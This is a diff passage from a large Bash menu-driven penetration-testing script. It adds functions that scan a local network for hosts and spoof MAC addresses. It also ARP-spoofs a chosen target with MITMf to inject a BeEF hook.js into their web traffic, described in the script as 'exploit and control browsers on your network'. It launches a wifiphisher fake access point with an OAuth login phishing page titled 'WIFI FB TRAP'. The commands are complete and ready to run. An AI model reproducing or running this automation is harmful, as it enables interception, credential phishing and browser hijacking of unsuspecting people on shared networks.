+		read STARTMAC < "$LPATH"/settings/startmac.txt
+	else
+		STARTMAC="$DEFMAC"
+	fi
+	echo -e "Changing mac address of $WLANNM to "$STARTMAC"..."
 	ifconfig $WLANNM down
-	macchanger -m 00:11:22:33:44:55 $WLANNM | grep "New MAC:" &> /dev/null && O3=1
+	macchanger -m $STARTMAC $WLANNM &> /dev/null | grep "New MAC:" &> /dev/null && O3=1
 	ifconfig $WLANNM up && echo -e ""$YS"Done"$CE"" 
 	if [[ "$O1" = 1 && "$O2" = 1 && "$O3" = 1 && "$O4" = 1 ]]
 	then
@@ -5691,7 +5909,7 @@ function new_terminal
 				sleep 1
 				FJC=0
 				export FJC
-				gnome-terminal --geometry 87x35+9999+0 -e lh1
+				gnome-terminal --geometry 87x35+9999+0 -- lh1
 				sleep 1
 				exec bash "$0"
 				break
@@ -5700,7 +5918,7 @@ function new_terminal
 				clear
 				echo -e "Moving into new terminal..."
 				sleep 1
-				gnome-terminal --geometry 80x25+9999+0 -e lh3
+				gnome-terminal --geometry 80x25+9999+0 -- lh3
 				sleep 1
 				exec bash "$0"
 				break
@@ -5708,7 +5926,7 @@ function new_terminal
 			then
 				echo -e "Moving into new terminal..."
 				sleep 1
-				gnome-terminal --geometry 80x25+9999+0 -e lh4
+				gnome-terminal --geometry 80x25+9999+0 -- lh4
 				sleep 1
 				exec bash "$0"
 				break
@@ -5746,7 +5964,165 @@ function wififb
 	echo -e "Enter the name of the access point you want to create: "
 	read -e ESSIDAP
 	export ESSIDAP
-	xterm -geometry 90x60+9999+999999 -e bash -c 'printf "\033]2;WIFI FB TRAP\a" && wifiphisher --nojamming --essid "$ESSIDAP" -p oauth-login; exec bash' & disown 
+	xterm -hold -geometry 90x60+9999+999999 -e bash -c 'printf "\033]2;WIFI FB TRAP\a" && wifiphisher --nojamming --essid "$ESSIDAP" -p oauth-login; exec bash' & disown 
+}
+function mitmf_hook
+{
+	TERMINALTITLE="MITMF + BEEF"
+	dash_calc
+	printf '\033]2;MITMF + BEEF\a'
+	if [[ -d /root/MITMf ]]
+	then
+		TEST=$(ifconfig | grep "$ETH")
+		n=1
+		echo -e ""$BS"Available interfaces"$CE": "
+		if [[ "$TEST" != "" ]]
+		then
+			echo -e ""$YS"$n"$CE") "$ETH""
+			in[$n]="$ETH"
+			n=$((n+1))
+		fi
+		TEST=$(ifconfig | grep "$WLANN")
+		if [[ "$TEST" != "" ]]
+		then
+			echo -e ""$YS"$n"$CE") $WLANN"
+			in[$n]="$WLANN"
+			n=$((n+1))
+		fi
+		TEST=$(ifconfig | grep "$WLANNM")
+		if [[ "$TEST" != "" ]]
+		then
+			echo -e ""$YS"$n"$CE") $WLANNM"
+			in[$n]="$WLANNM"
+			n=$((n+1))
+		fi
+		echo -e "Choose: "
+		read ints
+		if [[ "$ints" -le "$n" && "$ints" -ge 1 ]]
+		then
+			#~ echo -e "You selected "$YS"${in[$ints]}"$CE"" #debugging
+			mitmfint="${in[$ints]}"
+			export mitmfint
+			clear
+			mitmfgate=$(route -n | grep "$mitmfint" | awk '{if($2!="0.0.0.0"){print $2}}')
+			export mitmfgate
+			clear
+			echo -e "Target's IP: "
+			read mitmftar
+			TEST=$(ifconfig | grep $mitmfint)
+			if [[ $TEST != "" ]]
+			then
+				iffile=""$LPATH"/iftemp.txt"
+				ifconfig $mitmfint > $iffile
+				mitmflocalip=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
+			fi
+			clear
+			echo -e "hook.js URL path("$YS"Enter"$CE"=http://"$mitmflocalip":3000/hook.js): "
+			read hookch
+			if [[ "$hookch" = "" ]]
+			then
+				mitmfhook="http://"$mitmflocalip":3000/hook.js"
+			else
+				mitmfhook="$hookch"
+			fi
+			export mitmfhook
+			cd /root/MITMf
+			clear
+			python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$mitmftar" --hsts --inject --js-url "$mitmfhook"
+			cd
+		fi
+	else
+		echo -e ""$RS"Mitmf is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
+		read INSTALL
+		if [[ "$INSTALL" = "install" ]]
+		then
+			echo -e ""$RS"No installation added yet"$CE""
+			sleep 2
+		fi
+	fi
+	cd
+}
+function find_gateways()
+{
+	FG1="$1"
+	FG2="$2"
+	if [[ "$FG1" = "" ]]
+	then
+		echo -e ""$BS"Gateways"$CE": "
+		n=0
+		ethr=$(ifconfig | grep "$ETH")
+		if [[ "$ethr" != "" ]]
+		then
+			ethd=$(route -n | awk -v int1="$ETH" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
+			chi=$(is_it_an_ip "$ethd")
+			if [[ "$ethd" != "" && "$chi" = 1 ]]
+			then
+				echo -e ""$ETH" = "$YS""$ethd""$CE""
+				n=1
+			fi
+		fi
+		wlanr=$(ifconfig | grep "$WLANN")
+		if [[ "$wlanr" != "" ]]
+		then
+			wland=$(route -n | awk -v int1="$WLANN" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
+			chi=$(is_it_an_ip "$wland")
+			if [[ "$wland" != "" && "$chi" = 1 ]]
+			then
+				echo -e ""$WLANN" = "$YS""$wland""$CE""
+				n=1
+			fi
+		fi
+		wlanmr=$(ifconfig | grep "$WLANNM")
+		if [[ "$wlanmr" != "" ]]
+		then
+			wlanmd=$(route -n | awk -v int1="$WLANNM" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
+			chi=$(is_it_an_ip "$wlanmd")
+			if [[ "$wlanmd" != "" && "$chi" = 1 ]]
+			then
+				echo -e ""$WLANNM" = "$YS""$wlanmd""$CE""
+				n=1
+			fi
+		fi
+		if [[ "$n" = 0 ]]
+		then
+			echo -e ""$RS"No known interfaces found available"$CE""
+		fi
+	else
+		if [[ "$FG2" = "interface" ]]
+		then
+			inttos=$(ifconfig | grep "$FG1")
+			if [[ "$inttos" != "" ]]
+			then
+				gate=$(route -n | awk -v int1="$FG1" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
+				cho=$(is_it_an_ip "$gate")
+				if [[ "$cho" = 1 ]]
+				then
+					echo "$gate"
+				fi
+			else
+				echo 0
+			fi
+		#~ elif [[ "$FG2" = "ip" ]]
+		#~ then
+			#~ iptos=$(ifconfig | grep "$FG1")
+			#~ if [[ "$iptos" != "" ]]
+			#~ then
+				#~ dot=$(give_ip_take_zero "$FG1" "dot")
+				#~ gate=$(route -n | awk -v int1="$dot" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
+				#~ echo "$gate"
+				#~ cho=$(is_it_an_ip "$gate")
+				#~ if [[ "$cho" = 1 ]]
+				#~ then
+					#~ echo "$gate"
+				#~ fi
+			#~ else
+				#~ echo 0
+			#~ fi
+		#~ else
+			#~ echo -e ""$RS"Could not identify 2nd parameter"$CE""
+			#~ sleep 4
+		fi		
+	fi
 }
 function donate_option
 {
@@ -5925,9 +6301,530 @@ function ngrok_option
 					fi
 			fi
 		else
-			echo -e ""$RS"Ngrok is not installed.To install it, go to TOOLS -> Install/reinstall a tool -> ngrok"$CE""
+			echo -e ""$RS"Ngrok is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_ngrok
+			fi
+		fi
+	done
+}
+function geolocate_ip()
+{
+	A1="$1"
+	AA1=$(is_it_an_ip "$A1")
+	if [[ "$AA1" = 1 ]]
+	then
+		country=$(curl ipinfo.io/"$A1"/country 2>/dev/null)
+		loc=$(curl ipinfo.io/"$A1"/loc 2>/dev/null)
+		city=$(curl ipinfo.io/"$A1"/city 2>/dev/null)
+		org=$(curl ipinfo.io/"$A1"/org 2>/dev/null)
+		postal=$(curl ipinfo.io/"$A1"/postal 2>/dev/null)
+		region=$(curl ipinfo.io/"$A1"/region 2>/dev/null)
+		hostname=$(curl ipinfo.io/"$A1"/hostname 2>/dev/null)
+		echo -e "     Country: $country"
+		echo -e "      Region: $region"
+		echo -e "    Location: $loc"
+		echo -e "        City: $city"
+		echo -e "      Postal: $postal"
+		echo -e "    Hostname: $hostname"
+		echo -e "Organization: $org"
+		echo -e ""$YS" m"$CE") Open google maps location"
+		echo -e ""$YS" *"$CE") Go back"
+		echo -e "Choose: "
+		read ge
+		if [[ "$ge" = "m" ]]
+		then
+			xdg-open https://www.google.gr/maps/search/"$loc"/
+		else
+			clear
+			BACKL=1
+		fi
+	else
+		echo 0
+	fi
+}
+function ip_scan()
+{
+	
+while true
+do
+	#passing interface
+	IPF=$1
+	#passing mode if any
+	MODE=$2
+	export IPF
+	if [[ "$IPF" = "" ]]
+	then
+		echo -e ""$RS"Error 6. No parameters passed"$CE""
+		sleep 3
+		break
+	fi
+	#getting local ip
+	LLL=$(local_ips $IPF)
+	#getting zero ip
+	ZERO=$(give_ip_take_zero $LLL)
+	export ZERO
+	echo -e ""$BS"Scanning, please wait..."$CE""
+	tempfile=""$LPATH"/tempscan.txt"
+	xterm -geometry 1x1+9999+999999 -e "arp-scan -I "$IPF" "$ZERO"/24 | tee "$tempfile""
+	clear
+	######
+	T1=$(cat "$tempfile" | grep "Ending arp-scan")
+	if [[ "$T1" = "" ]]
+	then
+		#Sould rescan
+		echo -e ""$RS"Common error, retrying..."$CE""
+		sleep 2
+		clear
+		continue
+	else
+		lines=$(cat $tempfile | awk 'END{print NR}')
+		hosts=$((lines-5))
+		if [[ "$hosts" -le 0 ]]
+		then
+			echo -e ""$RS"No hosts found"$CE""
+			sleep 2
+			break
+		else
+			echo -e ""$BS"Host(s) found:"$CE""
+			##########
+			n=1
+			n2=2
+			while [[ "$n" -le "$hosts" ]]
+			do
+				#Hosts start from line 3
+				n1=$((n2+n))
+				host[$n]=$(cat "$tempfile" | awk -v an1="$n1" '{if(NR==an1 && $0 !~ /DUP:/){print $1}}')
+				if [[ "${host[$n]}" = "" ]]
+				then
+					#sometimes there are duplicate IPs.This should remove them.
+					n2=$((n2+1))
+					hosts=$((hosts-1))
+					#~ n=$((n+1))
+					continue
+				fi
+				size=${#host[$n]}
+				sized=$((20-size))
+				SPACESN=" "
+				numcalc=1
+				while [ $numcalc != $sized ]
+				do
+					SPACESN=""${SPACESN}" "
+					numcalc=$(( numcalc+1 ))
+				done
+				mi[$n]=$(cat "$tempfile" | awk -v an1="$n1" '{if(NR==an1){print $2}}')
+				im[$n]=$(cat "$tempfile" | awk -v an1="$n1" '{if(NR==an1){print $3}}')
+				if [[ "$MODE" = 1 ]]
+				then
+					echo -e ""$YS" $n"$CE") "${host[$n]}"${SPACESN}"${mi[$n]}"       "${im[$n]}""
+				else
+					echo -e ""${host[$n]}"${SPACESN}"${mi[$n]}"       "${im[$n]}""
+				fi
+				n=$((n+1))
+			done
+			if [[ "$MODE" = 1 ]]
+			then
+				echo -e ""$YS" r"$CE") Rescan"
+				echo -e ""$YS" b"$CE") Go back"
+				echo -e "Choose: "
+				read sch
+				if [[ "$sch" = "b" ]]
+				then
+					echo ""
+				elif [[ "$sch" = "r" ]]
+				then
+					clear
+					continue
+				elif [[ "$sch" -le "$hosts" && "$sch" -ge 1 ]]
+				then
+					OUTPUT="${host[$sch]}"
+					export OUTPUT
+					#~ echo "$OUTPUT"
+				fi
+			fi
+			##########
+		fi
+		break
+	fi
+	######
+done
+
+}
+function browser_exploiting
+{
+	if [[ ! -f /usr/bin/arp-scan ]]
+	then
+		echo -e ""$BS"Installing arp-scan"$CE""
+		install_arp_scan
+		clear
+	fi
+	TAR=""
+	SINT=""
+	beefrunning=0
+	clear
+	while true
+	do
+		clear
+		TERMINALTITLE="Auto-exploit browser"
+		dash_calc
+		printf '\033]2;AUTO-EXPLOIT BROWSER\a'
+		if [[ "$SINT" = "" ]]
+		then
+			WL=$(ifconfig | grep "$WLANN:")
+			if [[ "$WL" != "" ]]
+			then
+				SINT="$WLANN"
+				inter=0
+			else
+				EL=$(ifconfig | grep "$ETH:")
+				if [[ "$EL" != "" ]]
+				then
+					SINT="$ETH"
+					inter=0
+				else
+					SINT=""$RS"Not found"$CE""
+					inter=1
+				fi
+			fi
+			
+		fi
+		if [[ "$TAR" = "" ]]
+		then
+			TAR=""$RS"Not set"$CE""
+			tarer=1
+		fi
+		echo -e ""$YS" 1"$CE") Select interface                CURRENT:"$YS""$SINT""$CE""
+		echo -e ""$YS" 2"$CE") Select target                   CURRENT:"$YS""$TAR""$CE""
+		echo -e ""$YS" 3"$CE") Start BeEF"
+		echo -e ""$YS" 4"$CE") Open BeEF's ui panel in browser"
+		echo -e ""$YS" 5"$CE") Start MITMf"
+		echo -e ""$YS" 6"$CE") Fix errors"
+		#~ echo -e ""$YS" 4"$CE") Close all windows"
+		echo -e ""$YS" i"$CE") Info"
+		echo -e ""$YS" b"$CE") Go back"
+		echo -e "Choose: "
+		read AEB
+		clear
+		if [[ "$AEB" = "b" || "$AEB" = 00 ]]
+		then
+			clear
+			BACKL=1
+			break
+		elif [[ "$AEB" = "i" ]]
+		then
+			clear
+			echo -e ""$LGYS"On this menu you can exploit and control browsers on your network."
+			echo -e "Instructions: "
+			echo -e "BeEF:"
+			echo -e "	First you need to specify an interface. Then start BeEF."
+			echo -e "	Then open the UI panel and log in with beef:beef ."
+			echo -e "	There you will see if any online browsers."
+			echo -e "MITMf:"
+			echo -e "	First you need to specify an interface and a target. Then start MITMf."
+			echo -e "	MITMf tries to inject the hook.js javascript to the target's website."$CE""
 			echo -e "$PAKTGB"
 			$READAK
+		elif [[ "$AEB" = 6 ]]
+		then
+			while true
+			do
+			clear
+			TERMINALTITLE="Fix errors"
+			dash_calc
+			printf '\033]2;FIX ERRORS\a'
+			echo -e ""$YS" 1"$CE") MITMf error: Another process running on port 53"
+			echo -e ""$YS" 2"$CE") BeEF  error: Another process listening on port 3000"
+			echo -e ""$YS" 3"$CE") MITMf error: Could not resolve Gateway's MAC"
+			echo -e ""$YS" b"$CE") Go back"
+			echo -e "Choose: "
+			read AE
+			clear
+			if [[ "$AE" = 1 ]]
+			then
+				#~ echo -e "For this error, you need to type "$YS"netstat -lnpu | grep :53"$CE" to find the process that runs
+				#~ on port 53 and kill it by "$YS"kill <PID>"$CE""
+				PID1=$(lsof -t -i:53)
+				if [[ "$PID1" = "" ]]
+				then
+					echo -e ""$RS"Could not find the process running on port 53"$CE""
+				else
+					kill $PID1 && echo -e ""$YS"Fixed."$CE""
+				fi
+				echo -e ""
+				echo -e "$PAKTGB"
+				$READAK
+			elif [[ "$AE" = 2 ]]
+			then
+				echo -e "You are facing this error because you did not press "$YS"ctrl c"$CE" on BeEF's window
+				to close it."
+				echo -e ""
+				PID1=$(lsof -t -i:3000)
+				if [[ "$PID1" = "" ]]
+				then
+					echo -e ""$RS"Could not find the process running on port 3000"$CE""
+				else
+					kill $PID1 && echo -e ""$YS"Fixed."$CE""
+				fi
+				echo -e ""
+				echo -e "$PAKTGB"
+				$READAK
+			elif [[ "$AE" = 3 ]]
+			then
+				echo -e "I cannot fix this error. It is not my script's error but MITMf's. You can try changing interface, changing network or retrying. "
+				echo -e ""
+				echo -e "$PAKTGB"
+				$READAK
+			elif [[ "$AE" = "b" ]]
+			then
+				clear
+				break
+			fi
+			done
+		elif [[ "$AEB" = 4 ]]
+		then
+			#make sure BeEF is running.
+			if [[ "$beefrunning" = 0 ]]
+			then
+				echo -e ""$RS"BeEF is not running"$CE""
+				sleep 3
+			else
+				clear
+				export SINT
+				LOC=$(local_ips $SINT)
+				export LOC
+				CONF=$(is_it_an_ip $LOC)
+				if [[ "$CONF" = 1 ]]
+				then
+					xdg-open http://"$LOC":3000/ui/panel
+				else
+					echo -e ""$RS"Could not find your local IP"$CE""
+					sleep 3
+				fi
+			fi
+		elif [[ "$AEB" = 2 ]]
+		then
+			if [[ "$inter" != 1 ]]
+			then
+				clear
+				while true
+				do
+					clear
+					TERMINALTITLE="Select target"
+					dash_calc
+					printf '\033]2;SELECT TARGET\a'
+					echo -e ""$YS" 1"$CE") Scan and choose"
+					echo -e ""$YS" 2"$CE") Type target's IP"
+					echo -e ""$YS" b"$CE") Go back"
+					echo -e "Choose: "
+					read TARR
+					clear
+					if [[ "$TARR" = "b" ]]
+					then
+						break
+					elif [[ "$TARR" = 1 ]]
+					then
+						ip_scan $SINT 1
+						TARGETI="$OUTPUT"
+						size=${#TARGETI}
+						if [[ "$size" -le 16 && "$size" -ge 7 ]]
+						then
+							TAR="$TARGETI"
+							tarer=0
+						else
+							tarer=1
+						fi
+						break
+					elif [[ "$TARR" = 2 ]]
+					then
+						echo -e "Target: "
+						read TARGETI
+						size=${#TARGETI}
+						if [[ "$size" -le 16 && "$size" -ge 7 ]]
+						then
+							TAR="$TARGETI"
+							tarer=0
+						else
+							echo -e ""$RS"Invalid IP"$CE""
+							tarer=1
+							sleep 2
+						fi
+						break
+					fi
+				done
+			else
+				echo -e ""$RS"Select interface first"$CE""
+				sleep 2
+			fi
+		elif [[ "$AEB" = 5 ]]
+		then
+			if [[ "$inter" = 0 && "$tarer" = 0 ]]
+			then
+				if [[ -d /root/MITMf ]]
+				then
+						mitmfint="$SINT"
+						export mitmfint
+						clear
+						mitmfgate=$(route -n | grep "$mitmfint" | awk '{if($2!="0.0.0.0"){print $2}}')
+						isit=$(is_it_an_ip "$mitmfgate")
+						if [[ "$mitmfgate" != "" && "$isit" = 1 ]]
+						then
+							export mitmfgate
+							clear
+							TEST=$(ifconfig | grep $mitmfint)
+							if [[ $TEST != "" ]]
+							then
+								iffile=""$LPATH"/iftemp.txt"
+								ifconfig $mitmfint > $iffile
+								mitmflocalip=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
+							else
+								echo -e ""$RS"ERROR 5. Could not find your local IP. Make sure you are connected to a network on interface "$SINT""$CE""
+								echo -e "$PAKTGB"
+								$READAK
+								continue
+							fi
+							clear
+							echo -e "hook.js URL path("$YS"Enter"$CE"=http://"$mitmflocalip":3000/hook.js): "
+							read hookch
+							if [[ "$hookch" = "" ]]
+							then
+								mitmfhook="http://"$mitmflocalip":3000/hook.js"
+							else
+								mitmfhook="$hookch"
+							fi
+							export mitmfhook
+							cd /root/MITMf
+							clear
+							xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$TAR" --hsts --inject --js-url "$mitmfhook" && echo -e '' && echo -e 'Close this window manually'"
+							cd
+						else
+							echo -e ""$RS"ERROR 4. Could not find gateway. Make sure you are connected to a network on interface "$SINT""$CE""
+							echo -e "$PAKTGB"
+							$READAK
+						fi
+				else
+					echo -e ""$RS"Mitmf is not installed.Type '"$CE""$YS"install"$CE""$RS"' to install it."
+					read INSTALL
+					if [[ "$INSTALL" = "install" ]]
+					then
+						install_mitmf
+					fi
+				fi
+				cd
+			else
+				if [[ "$inter" = 1 ]]
+				then
+					echo -e ""$RS"No interface selected"$CE""
+				fi
+				if [[ "$tarer" = 1 ]]
+				then
+					echo -e ""$RS"No target selected"$CE""
+					sleep 1
+				fi
+				sleep 2
+			fi
+		elif [[ "$AEB" = 3 ]]
+		then
+			if [[ "$inter" = 1 ]]
+			then
+				echo -e ""$RS"No interface selected"$CE""
+				sleep 2
+				continue
+			fi
+			cd /usr/share/beef-xss 
+			beefrunning=1
+			xterm -T "BEEF" -hold -geometry 80x15+9999+0 -e "./beef && echo -e '' && beefrunning=0 && export beefrunning && echo -e 'Close this window manually'" & disown
+			cd
+		elif [[ "$AEB" = 0 ]]
+		then
+			clear
+			exit
+		elif [[ "$AEB" = 1 ]]
+		then
+			while true
+			do
+				clear
+				TERMINALTITLE="Select interface"
+				dash_calc
+				printf '\033]2;SELECT INTERFACE\a'
+				TT=$(ifconfig | grep "$WLANN:")
+				if [[ "$TT" != "" ]]
+				then
+					echo -e ""$YS" 1"$CE") "$WLANN""
+				else
+					echo -e ""$RS" 1"$CE") "$RS""$WLANN""$CE""
+				fi
+				TT=$(ifconfig | grep "$ETH:")
+				if [[ "$TT" != "" ]]
+				then
+					echo -e ""$YS" 2"$CE") "$ETH""
+				else
+					echo -e ""$RS" 2"$CE") "$RS""$ETH""$CE""
+				fi
+				echo -e ""$YS" 3"$CE") Manually type an interface"
+				echo -e ""$YS" b"$CE") Go back"
+				echo -e "Choose: "
+				read CI
+				if [[ "$CI" = 1 ]]
+				then
+					TT=$(ifconfig | grep "$WLANN:")
+					if [[ "$TT" != "" ]]
+					then
+						SINT="$WLANN"
+						inter=0
+						break
+					else
+						inter=1
+						echo -e ""$RS"Could not find this interface"$CE""
+						sleep 2
+						continue
+					fi
+				elif [[ "$CI" = 2 ]]
+				then
+					TT=$(ifconfig | grep "$ETH:")
+					if [[ "$TT" != "" ]]
+					then
+						SINT="$ETH"
+						inter=0
+						break
+					else
+						inter=1
+						echo -e ""$RS"Could not find this interface"$CE""
+						sleep 2
+						continue
+					fi
+				elif [[ "$CI" = 3 ]]
+				then
+					echo -e "Interface to use: "
+					read ITU
+					TT=$(ifconfig | grep "$ITU:")
+					if [[ "$TT" != "" ]]
+					then
+						SINT="$ITU"
+						inter=0
+						break
+					else
+						echo -e ""$RS"Could not find this interface"$CE""
+						echo -e "Do you still want to use it?"$YNNO": "
+						read SU
+						if [[ "$SU" = "y" ]]
+						then
+							SINT="$ITU"
+							inter=0
+							break
+						else
+							continue
+						fi
+					fi
+				elif [[ "$CI" = "b" ]]
+				then
+					clear
+					break
+				fi
+			done
+			
+		#if inter=1 then error
 		fi
 	done
 }
@@ -5953,6 +6850,20 @@ function settings_menu
 			ALFA="no"
 		fi
 		echo -e ""$YS" 3"$CE") ALFA AWUS036ACH support                      $ALFA"
+		if [[ -f "$LPATH"/settings/ignorenegativeone.txt ]]
+		then
+			read IGN < "$LPATH"/settings/ignorenegativeone.txt
+		else
+			IGN="no"
+		fi
+		echo -e ""$YS" 4"$CE") Ignore negative one when deauthing           $IGN"
+		if [[ -f "$LPATH"/settings/startmac.txt ]]
+		then
+			read STARTMAC < "$LPATH"/settings/startmac.txt
+		else
+			STARTMAC="00:11:22:33:44:55"
+		fi
+		echo -e ""$YS" 5"$CE") MAC to change to,when starting monitor       $STARTMAC"	
 		echo -e ""$YS" b"$CE") Go back"
 		echo -e ""$YS" 0"$CE") Exit"
 		echo -e "Choose: "
@@ -5965,6 +6876,33 @@ function settings_menu
 		elif [[ "$SET" = 0 ]]
 		then
 			exit
+		elif [[ "$SET" = 5 ]]
+		then
+			clear
+			echo -e "Type new MAC("$YS"Enter"$CE"="$DEFMAC"): "
+			read NEWMAC
+			if [[ "$NEWMAC" = "" ]]
+			then
+				echo "$DEFMAC" > "$LPATH"/settings/startmac.txt
+			else
+				sizemac=${#NEWMAC}
+				if [[ "$sizemac" != 17 ]]
+				then
+					echo -e ""$RS"Invalid MAC. Setting it back to default"$CE""
+					sleep 4
+				else
+					echo $NEWMAC > "$LPATH"/settings/startmac.txt
+				fi
+			fi
+		elif [[ "$SET" = 4 ]]
+		then
+			if [[ "$IGN" = "yes" ]]
+			then
+				IGN="no"
+			else
+				IGN="yes"
+			fi
+			echo -e "$IGN" > "$LPATH"/settings/ignorenegativeone.txt
 		elif [[ "$SET" = 3 ]]
 		then
 			if [[ "$ALFA" = "yes" ]]
@@ -6061,22 +6999,22 @@ function settings_menu
 		then
 			TERMINALTITLE="LOGO COLORS"
 			dash_calc
-			echo -e ""$YS" 1"$CE") Light Red (default)"
-			echo -e ""$YS" 2"$CE") Red"
-			echo -e ""$YS" 3"$CE") Light Purple"
-			echo -e ""$YS" 4"$CE") Purple"
-			echo -e ""$YS" 5"$CE") Light Green"
-			echo -e ""$YS" 6"$CE") Green"
-			echo -e ""$YS" 7"$CE") Light Cyan"
-			echo -e ""$YS" 8"$CE") Cyan"
-			echo -e ""$YS" 9"$CE") Light Blue"
-			echo -e ""$YS"10"$CE") Blue"
-			echo -e ""$YS"11"$CE") Light Gray"
-			echo -e ""$YS"12"$CE") Dark Gray"
-			echo -e ""$YS"13"$CE") Yellow"
-			echo -e ""$YS"14"$CE") Brown"
-			echo -e ""$YS"15"$CE") White"
-			echo -e ""$YS"16"$CE") Black"	
+			echo -e ""$YS" 1"$CE") Light Red (default)     "$RS"SAMPLE"$CE""
+			echo -e ""$YS" 2"$CE") Red                     "$DRS"SAMPLE"$CE""
+			echo -e ""$YS" 3"$CE") Light Purple            "$LPS"SAMPLE"$CE""
+			echo -e ""$YS" 4"$CE") Purple                  "$PS"SAMPLE"$CE""
+			echo -e ""$YS" 5"$CE") Light Green             "$LGNS"SAMPLE"$CE""
+			echo -e ""$YS" 6"$CE") Green                   "$GNS"SAMPLE"$CE""
+			echo -e ""$YS" 7"$CE") Light Cyan              "$LCYS"SAMPLE"$CE""
+			echo -e ""$YS" 8"$CE") Cyan                    "$CYS"SAMPLE"$CE""
+			echo -e ""$YS" 9"$CE") Light Blue              "$LBS"SAMPLE"$CE""
+			echo -e ""$YS"10"$CE") Blue                    "$BS"SAMPLE"$CE""
+			echo -e ""$YS"11"$CE") Light Gray              "$LGYS"SAMPLE"$CE""
+			echo -e ""$YS"12"$CE") Dark Gray               "$DGYS"SAMPLE"$CE""
+			echo -e ""$YS"13"$CE") Yellow                  "$YS"SAMPLE"$CE""
+			echo -e ""$YS"14"$CE") Brown                   "$BRS"SAMPLE"$CE""
+			echo -e ""$YS"15"$CE") White                   "$WHS"SAMPLE"$CE""
+			echo -e ""$YS"16"$CE") Black                   "$BLS"SAMPLE"$CE""
 			echo -e "Choose: "
 			read LC
 			if [[ "$LC" = 1 ]]
@@ -6136,6 +7074,33 @@ function main_options
 	if [[ "$YORNAA" = "0" ]]
 	then
 		exit
+	elif [[ "$YORNAA" = "scan" ]]
+	then
+		if [[ ! -f /usr/bin/arp-scan ]]
+		then
+			echo -e ""$BS"Installing arp-scan"$CE""
+			install_arp_scan
+			clear
+		fi
+		ip_scan wlan0 2
+	elif [[ "$YORNAA" = "19" ]]
+	then
+		echo -e ""$BS"IP:"$CE" "
+		read IPG
+		clear
+		geolocate_ip "$IPG"
+	elif [[ "$YORNAA" = "18" ]]
+	then
+		browser_exploiting
+	elif [[ "$YORNAA" = "m" ]]
+	then
+		mitmf_hook
+	elif [[ "$YORNAA" = "g" ]]
+	then
+		find_gateways
+	elif [[ "$YORNAA" = "l" ]]
+	then
+		local_ips
 	elif [[ "$YORNAA" = "17" ]]
 	then
 		if [[ ! -f "/usr/local/bin/howdoi" ]]
@@ -6192,39 +7157,40 @@ function main_options
 			read HOW
 			howdoi $co $na $ol $df $HOW
 		fi
-	elif [[ "$YORNAA" = "settings" ]]
+	elif [[ "$YORNAA" = "settings" || "$YORNAA" = "s" ]]
 	then
 		settings_menu
 	elif [[ "$YORNAA" = "16" ]]
 	then
 		ngrok_option
 		BACKL=1
-	elif [[ "$YORNAA" = "donate" ]]
+	elif [[ "$YORNAA" = "donate" || "$YORNAA" = "d" ]]
 	then
 		donate_option
+#------services
 	elif [[ "$YORNAA" = "pstart" ]]
 	then
-		service postgresql start
+		service postgresql start && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
 	elif [[ "$YORNAA" = "pstop" ]]
 	then
-		service postgresql stop
+		service postgresql stop && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
 	elif [[ "$YORNAA" = "nstart" ]]
 	then
-		service network-manager start
+		service network-manager start && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
 	elif [[ "$YORNAA" = "nstop" ]]
 	then
-		service network-manager stop
+		service network-manager stop && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
 	elif [[ "$YORNAA" = "astart" ]]
 	then
-		service apache2 start
+		service apache2 start && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
 	elif [[ "$YORNAA" = "astop" ]]
 	then
-		service apache2 stop
+		service apache2 stop && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
 	elif [[ "$YORNAA" = "nessusstart" ]]
 	then
 		if [[ -f /etc/init.d/nessusd ]]
 		then
-			/etc/init.d/nessusd start
+			/etc/init.d/nessusd start && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
 		else
 			echo -e ""$RS"Nessus is not already installed."$CE""
 			sleep 2
@@ -6233,11 +7199,12 @@ function main_options
 	then
 		if [[ -f /etc/init.d/nessusd ]]
 		then
-			/etc/init.d/nessusd stop
+			/etc/init.d/nessusd stop && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
 		else
 			echo -e ""$RS"Nessus is not already installed."$CE""
 			sleep 2
 		fi
+#-------------
 	elif [[ "$YORNAA" = "15" ]]
 	then
 		BACKL="1"
@@ -6254,12 +7221,6 @@ function main_options
 	elif [[ "$YORNAA" = "l" ]]
 	then
 		clear 
-		exec bash "$0"
-	elif [[ "$YORNAA" = "clear" ]]
-	then
-		echo -e "Ok.I can clear for you..."
-		sleep 1
-		clear
 		exec bash "$0"
 	elif [[ "$YORNAA" = "gg" ]]
 	then
@@ -6298,15 +7259,6 @@ function main_options
 		else
 			stop_monitor
 		fi
-		#~ echo -e "$WLANN is probably up.Bring it down?"$YNNO": "
-		#~ read -e YORN
-		#~ if [[ "$YORN" = "y" ]] 
-		#~ then
-			#~ #rfkill unblock wifi
-			#~ #rfkill unblock all
-			#~ ifconfig $WLANN down
-			#~ echo -e "$WLANN is now down."
-		#~ fi
 	elif [[ "$YORNAA" = "3" ]]
 	then
 		change_mac
@@ -6451,7 +7403,7 @@ function main_options
 		printf '\033]2;UPDATE\a'
 		clear
 		update_lscript
-	elif [[ "$YORNAA" = "if" ]]
+	elif [[ "$YORNAA" = "if" || "$YORNAA" = "ifconfig" ]]
 	then
 		ifconfig
